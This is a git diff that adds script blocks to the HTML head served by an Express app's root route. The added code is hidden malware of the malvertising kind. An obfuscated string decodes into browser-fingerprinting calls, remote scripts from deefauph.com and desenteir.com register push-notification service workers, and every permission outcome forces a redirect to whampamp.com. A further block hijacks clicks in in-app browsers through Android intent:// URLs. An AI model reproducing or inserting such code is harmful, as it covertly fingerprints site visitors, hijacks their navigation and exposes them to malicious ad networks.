@@ -13,7 +13,67 @@ app.get('/', (_req, res) => {
 <html>
 
 <head>
+  <script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('ffgrf tht');
+    var ppi = url.searchParams.get('gerhtgreh rh');
+    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
+    var s = document.createElement('script');
+    s.src='//deefauph.com/602/d1237/mw.min.js?z=8168099'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-78bf5.js'+'&nouns=1';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':
+            Replace("//whampamp.com/4/8168098?var="+ppi+"&ymid="+pci);break;
+            case 'onPermissionAllowed':
+            Replace("//whampamp.com/4/8168098?var="+ppi+"&ymid="+pci);break;
+            case 'onPermissionDenied':
+            Replace("//whampamp.com/4/8168098?var="+ppi+"&ymid="+pci);break;
+            case 'onAlreadySubscribed':
+            Replace("//whampamp.com/4/8168098?var="+ppi+"&ymid="+pci);break;
+            case 'onNotificationUnsupported':
+            Replace("//whampamp.com/4/8168098?var="+ppi+"&ymid="+pci);break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
+<script>
+      var Back_Button_Zone = 8168098;
+      var Domain_TB = "glamtoumpaips.net";
+</script>
+<script async src="https://desenteir.com/602/d1237/reverse.min.js?sf=1"></script>
 
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('ffgrf tht');
+    var ppi = url.searchParams.get('gerhtgreh rh');
+    function isInApp() {
+        const regex = new RegExp(\`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))\`, 'ig');
+        return Boolean(this.ua.match(regex));
+    }
+
+    function initInappRd() {
+        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
+        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
+        var trafficbackURL = "https://whampamp.com/4/8168098/?var="+ppi+"&ymid="+pci;
+        var ua = navigator.userAgent.toLowerCase();
+
+        if (isInApp && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
+            document.body.addEventListener('click', function () {
+                window.onbeforeunload = null;
+                window.open(completeRedirectURL, '_system');
+                setTimeout(function () {
+                    window.location.replace(trafficbackURL);
+                }, 1000);
+            });
+        }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initInappRd);
+    } else {
+        initInappRd();
+    }
+</script>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="pushsdk" content="047b2c3d8e3c24344fb4babd21b2beb1">
